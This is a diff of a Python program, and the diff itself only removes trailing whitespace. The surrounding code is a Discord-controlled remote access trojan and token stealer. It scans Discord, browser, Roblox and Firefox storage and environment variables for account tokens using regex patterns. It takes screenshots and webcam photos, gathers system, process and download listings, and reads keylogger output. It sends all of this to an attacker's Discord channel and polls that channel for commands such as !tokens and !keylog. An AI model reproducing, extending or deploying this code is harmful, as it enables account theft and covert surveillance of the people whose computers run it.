@@ -239,7 +239,7 @@ def send_discord_message(content, file_bytes=None, filename=None):
 def search_tokens():
     """Search for tokens in common locations"""
     tokens = []
-    
+
     # Token patterns
     patterns = [
         r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}',
@@ -248,11 +248,11 @@ def search_tokens():
         r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}',
         r'[\\w-]{20,30}\\.[\\w-]{6}\\.[\\w-]{27,40}',
     ]
-    
+
     # Search paths (Discord, Chrome, Edge, Brave, Roblox, Firefox, system)
     appdata = os.environ.get("APPDATA", "")
     localappdata = os.environ.get("LOCALAPPDATA", "")
-    
+
     search_paths = []
     search_paths.extend([
         os.path.join(appdata, "discord", "Local Storage", "leveldb"),
@@ -273,7 +273,7 @@ def search_tokens():
         os.path.expanduser("~/Documents"),
         os.path.expanduser("~/Downloads"),
     ])
-    
+
     # Firefox profiles
     firefox_profiles = os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
     if os.path.exists(firefox_profiles):
@@ -281,7 +281,7 @@ def search_tokens():
             if profile.endswith('.default') or profile.endswith('.default-release'):
                 search_paths.append(os.path.join(firefox_profiles, profile, "webappsstore.sqlite"))
                 search_paths.append(os.path.join(firefox_profiles, profile, "cookies.sqlite"))
-    
+
     for path in search_paths:
         if not os.path.exists(path):
             continue
@@ -317,7 +317,7 @@ def search_tokens():
                                 pass
         except:
             pass
-    
+
     # Check environment variables
     for key, value in os.environ.items():
         for pattern in patterns:
@@ -326,7 +326,7 @@ def search_tokens():
                 if match not in tokens:
                     tokens.append(match)
                     send_debug(f"Found token in environment variable: {key}")
-    
+
     return tokens
 
 def get_full_system_report():
@@ -411,7 +411,7 @@ def process_command(command, content):
                 send_debug("Screenshot sent")
             else:
                 send_discord_message("Failed to take screenshot")
-        
+
         elif command == "camera":
             send_discord_message("Taking camera photo...")
             camera = take_camera_photo()
@@ -421,12 +421,12 @@ def process_command(command, content):
                 send_debug("Camera photo sent")
             else:
                 send_discord_message("Failed to take camera photo")
-        
+
         elif command == "system":
             data = get_full_system_report()
             summary = f"=== SYSTEM REPORT ===\\nComputer: {data['system']['computer_name']}\\nUser: {data['system']['username']}\\nOS: {data['system']['os']}\\nArchitecture: {data['system']['architecture']}\\nCPU: {data['system']['processor']}\\nCPU Cores: {data['system']['cpu_count']}\\nIP: {data['network']['ip']}\\nExternal IP: {data['network']['external_ip']}\\nDrives: {len(data.get('drives', []))}\\nDownloads: {len(data.get('downloads', []))}\\nProcesses: {len(data.get('processes', []))}\\nInstalled Software: {len(data.get('installed_software', []))}\\nTokens Found: {len(data.get('tokens_found', []))}"
             send_discord_message(f"```\\n{summary}\\n```")
-        
+
         elif command == "tokens":
             send_debug("Searching for tokens...")
             tokens = search_tokens()
@@ -437,7 +437,7 @@ def process_command(command, content):
             else:
                 send_discord_message("No tokens found")
                 send_debug("No tokens found")
-        
+
         elif command == "downloads":
             data = get_full_system_report()
             if data.get("downloads"):
@@ -445,7 +445,7 @@ def process_command(command, content):
                 send_discord_message(f"Downloads:\\n```\\n{dl_list}\\n```")
             else:
                 send_discord_message("No downloads found")
-        
+
         elif command == "processes":
             data = get_full_system_report()
             if data.get("processes"):
@@ -453,23 +453,23 @@ def process_command(command, content):
                 send_discord_message(f"Running processes:\\n```\\n{proc_list}\\n```")
             else:
                 send_discord_message("No processes found")
-        
+
         elif command == "keylog":
             keys = keylogger.get_buffer() if 'keylogger' in globals() else None
             if keys:
                 send_discord_message(f"Keylog:\\n```\\n{keys[-2000:]}\\n```")
             else:
                 send_discord_message("No keys logged yet")
-        
+
         elif command == "help":
             help_text = "**Available Commands:**\\n!screenshot - Take a screenshot\\n!camera - Take camera photo\\n!system - Show system info\\n!tokens - Search for Discord/Roblox tokens\\n!downloads - Show downloads folder\\n!processes - Show running processes\\n!keylog - Show recent keystrokes\\n!help - Show this message\\n!stop - Stop the bot"
             send_discord_message(help_text)
-        
+
         elif command == "stop":
             send_discord_message("Stopping bot...")
             global running
             running = False
-        
+
         return True
     except Exception as e:
         send_error(f"Command {command} failed: {str(e)}\\n{traceback.format_exc()}")
@@ -478,24 +478,24 @@ def process_command(command, content):
 def command_handler():
     global running
     last_message_id = None
-    
+
     send_debug("Command handler started, listening for commands...")
     send_discord_message(f"Bot started on {socket.gethostname()}\\nType !help for commands")
-    
+
     while running:
         try:
             headers = {"Authorization": USER_TOKEN}
             params = {"limit": 5}
             if last_message_id:
                 params["after"] = last_message_id
-            
+
             response = requests.get(
                 f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages",
                 headers=headers,
                 params=params,
                 timeout=10
             )
-            
+
             if response.status_code == 200:
                 messages = response.json()
                 for msg in messages:
